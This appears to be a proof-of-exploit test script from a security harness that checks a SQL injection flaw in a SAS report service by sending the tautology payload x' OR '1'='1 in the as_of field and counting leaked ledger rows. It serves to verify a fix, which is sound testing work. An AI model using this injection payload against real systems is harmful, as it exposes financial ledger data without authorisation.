"""LG-SQLI-002 proof-of-exploit: SQL injection in the SAS report PROC SQL EXPLICIT pass-through.

Asks the report for a non-existent transfer_id (GHOST999) but supplies an as_of that breaks out of
the pass-through literal (x' OR '1'='1). With as_of_dates=on the as_of validation and quoting are
skipped, so the tautology returns EVERY ledger row past the transfer_id filter. Fires when the
report returns rows for a transfer with no postings of its own. With the fix the payload fails
as_of validation and no rows come back. Hits the SAS service directly. Env: SAS_URL.
"""

from harness import env, http


def fire():
    reply = http.post_json(
        f"{env.url('SAS_URL')}/report",
        {"transfer_id": "GHOST999", "report_type": "POSTING", "as_of": "x' OR '1'='1"},
    )
    try:
        rows = reply.json().get("rows")
    except ValueError:
        rows = None
    count = len(rows) if isinstance(rows, list) else -1
    if count > 0:
        return True, f"injection returned {count} ledger row(s) for a non-existent transfer_id"
    return False, f"rows={count} (reply: {reply.text[:200]})"
